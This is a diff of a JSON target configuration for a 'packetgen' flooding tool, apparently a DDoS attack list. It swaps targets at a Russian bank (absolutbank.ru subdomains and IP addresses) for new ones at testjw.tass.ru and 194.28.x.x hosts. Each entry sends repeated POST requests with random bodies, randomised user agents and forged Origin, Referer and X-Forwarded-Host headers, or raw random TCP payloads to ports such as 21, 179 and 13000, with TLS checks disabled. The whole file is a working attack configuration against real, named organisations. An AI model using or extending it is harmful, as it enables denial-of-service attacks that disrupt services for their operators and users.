@@ -8,17 +8,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://server3.ibank.absolutbank.ru",
+            "count": 16,
+            "name": "http://testjw.tass.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "server3.ibank.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "testjw.tass.ru:80"
                     }
                 },
                 "packet": {
@@ -26,7 +23,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://server3.ibank.absolutbank.ru",
+                            "path": "http://testjw.tass.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +36,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://server3.ibank.absolutbank.ru",
-                                "Referer": "https://server3.ibank.absolutbank.ru",
-                                "X-Forwarded-Host": "server3.ibank.absolutbank.ru",
+                                "Origin": "http://testjw.tass.ru",
+                                "Referer": "http://testjw.tass.ru",
+                                "X-Forwarded-Host": "testjw.tass.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,58 +49,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://sslgate-vr.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.237.1:179",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "sslgate-vr.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://sslgate-vr.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://sslgate-vr.absolutbank.ru",
-                                "Referer": "https://sslgate-vr.absolutbank.ru",
-                                "X-Forwarded-Host": "sslgate-vr.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "tcp://193.28.234.11:993",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "193.28.234.11:993"
+                        "address": "194.28.237.1:179"
                     }
                 },
                 "packet": {
@@ -118,316 +71,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "http://91.199.156.27",
+            "count": 16,
+            "name": "tcp://194.28.239.135:21",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.199.156.27:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.199.156.27",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.199.156.27",
-                                "Referer": "http://91.199.156.27",
-                                "X-Forwarded-Host": "91.199.156.27",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://absolutbank.ru",
-                                "Referer": "https://absolutbank.ru",
-                                "X-Forwarded-Host": "absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://91.199.156.38",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.199.156.38:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.199.156.38",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.199.156.38",
-                                "Referer": "http://91.199.156.38",
-                                "X-Forwarded-Host": "91.199.156.38",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://ip187.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip187.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://ip187.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip187.absolutbank.ru",
-                                "Referer": "https://ip187.absolutbank.ru",
-                                "X-Forwarded-Host": "ip187.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://91.199.156.27",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.199.156.27:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://91.199.156.27",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://91.199.156.27",
-                                "Referer": "https://91.199.156.27",
-                                "X-Forwarded-Host": "91.199.156.27",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://server240.ibank.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "server240.ibank.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://server240.ibank.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://server240.ibank.absolutbank.ru",
-                                "Referer": "https://server240.ibank.absolutbank.ru",
-                                "X-Forwarded-Host": "server240.ibank.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://quiktest.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "quiktest.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://quiktest.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://quiktest.absolutbank.ru",
-                                "Referer": "https://quiktest.absolutbank.ru",
-                                "X-Forwarded-Host": "quiktest.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "tcp://193.28.234.11:465",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "193.28.234.11:465"
+                        "address": "194.28.239.135:21"
                     }
                 },
                 "packet": {
@@ -442,483 +93,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://server175.ibank.absolutbank.ru",
+            "count": 16,
+            "name": "tcp://194.28.239.101:13000",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "server175.ibank.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://server175.ibank.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://server175.ibank.absolutbank.ru",
-                                "Referer": "https://server175.ibank.absolutbank.ru",
-                                "X-Forwarded-Host": "server175.ibank.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://af.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "af.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://af.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://af.absolutbank.ru",
-                                "Referer": "https://af.absolutbank.ru",
-                                "X-Forwarded-Host": "af.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://ip186.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip186.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://ip186.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip186.absolutbank.ru",
-                                "Referer": "https://ip186.absolutbank.ru",
-                                "X-Forwarded-Host": "ip186.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://91.199.156.7",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.199.156.7:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://91.199.156.7",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://91.199.156.7",
-                                "Referer": "http://91.199.156.7",
-                                "X-Forwarded-Host": "91.199.156.7",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://nap.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "nap.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://nap.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://nap.absolutbank.ru",
-                                "Referer": "http://nap.absolutbank.ru",
-                                "X-Forwarded-Host": "nap.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://jira.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "jira.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://jira.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://jira.absolutbank.ru",
-                                "Referer": "http://jira.absolutbank.ru",
-                                "X-Forwarded-Host": "jira.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://af.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "af.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://af.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://af.absolutbank.ru",
-                                "Referer": "http://af.absolutbank.ru",
-                                "X-Forwarded-Host": "af.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://193.28.234.34",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "193.28.234.34:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://193.28.234.34",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://193.28.234.34",
-                                "Referer": "https://193.28.234.34",
-                                "X-Forwarded-Host": "193.28.234.34",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "http://ip186.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip186.absolutbank.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://ip186.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://ip186.absolutbank.ru",
-                                "Referer": "http://ip186.absolutbank.ru",
-                                "X-Forwarded-Host": "ip186.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://ip189.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip189.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://ip189.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip189.absolutbank.ru",
-                                "Referer": "https://ip189.absolutbank.ru",
-                                "X-Forwarded-Host": "ip189.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://ip57.absolutbank.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "ip57.absolutbank.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://ip57.absolutbank.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip57.absolutbank.ru",
-                                "Referer": "https://ip57.absolutbank.ru",
-                                "X-Forwarded-Host": "ip57.absolutbank.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "tcp://91.199.156.11:993",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "91.199.156.11:993"
+                        "address": "194.28.239.101:13000"
                     }
                 },
                 "packet": {
@@ -933,14 +115,58 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://91.199.156.11:465",
+            "count": 16,
+            "name": "https://194.28.236.42",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "91.199.156.11:465"
+                        "address": "194.28.236.42:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://194.28.236.42",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://194.28.236.42",
+                                "Referer": "https://194.28.236.42",
+                                "X-Forwarded-Host": "194.28.236.42",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.88:8443",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.88:8443"
                     }
                 },
                 "packet": {
@@ -955,14 +181,77 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://ip47.absolutbank.ru",
+            "count": 16,
+            "name": "http://194.28.237.10",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "ip47.absolutbank.ru:443",
+                        "address": "194.28.237.10:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://194.28.237.10",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://194.28.237.10",
+                                "Referer": "http://194.28.237.10",
+                                "X-Forwarded-Host": "194.28.237.10",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "tcp://194.28.236.27:1352",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "194.28.236.27:1352"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 16,
+            "name": "https://testjw.tass.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "testjw.tass.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -973,7 +262,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://ip47.absolutbank.ru",
+                            "path": "https://testjw.tass.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -986,9 +275,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://ip47.absolutbank.ru",
-                                "Referer": "https://ip47.absolutbank.ru",
-                                "X-Forwarded-Host": "ip47.absolutbank.ru",
+                                "Origin": "https://testjw.tass.ru",
+                                "Referer": "https://testjw.tass.ru",
+                                "X-Forwarded-Host": "testjw.tass.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
